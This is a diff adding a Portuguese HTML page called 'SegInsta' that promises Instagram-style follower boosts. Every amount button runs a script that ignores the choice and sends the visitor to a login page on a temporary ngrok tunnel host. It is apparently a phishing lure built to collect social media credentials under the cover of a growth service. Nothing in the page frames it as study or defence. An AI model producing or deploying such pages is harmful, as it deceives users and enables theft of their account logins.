@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SegInsta</title>
+    <link rel="stylesheet" href="index.css"> <!-- Vinculando o arquivo CSS -->
+</head>
+<body>
+    <h1>Bem-vindo à SegInsta</h1>
+    <p>🚀 Incremente sua presença online com nosso novo app! Ganhe seguidores reais e ativos para impulsionar sua visibilidade. Baixe agora e veja seu perfil crescer! 📈</p>
+
+    <button onclick="showOptions()">Clique aqui</button>
+
+    <div id="options">
+        <p>Escolha uma opção:</p>
+        <button class="options-btn" onclick="showAmount(500)">500</button>
+        <button class="options-btn" onclick="showAmount(1000)">1000</button>
+        <button class="options-btn" onclick="showAmount(3000)">3000</button>
+        <button class="options-btn" onclick="showAmount(7000)">7000</button>
+        <button class="options-btn" onclick="showAmount(10000)">10000</button>
+        <p id="chosenOption"></p>
+    </div>
+
+    <script>
+        function showOptions() {
+            var optionsDiv = document.getElementById('options');
+            optionsDiv.style.display = optionsDiv.style.display === 'none' ? 'block' : 'none';
+            document.getElementById('chosenOption').style.display = 'none';
+        }
+
+        function showAmount(amount) {
+            // Redirecionar para o site desejado
+            window.location.href = 'https://c29f-45-225-123-30.ngrok-free.app/login.html';
+        }
+    </script>
+</body>
+</html>
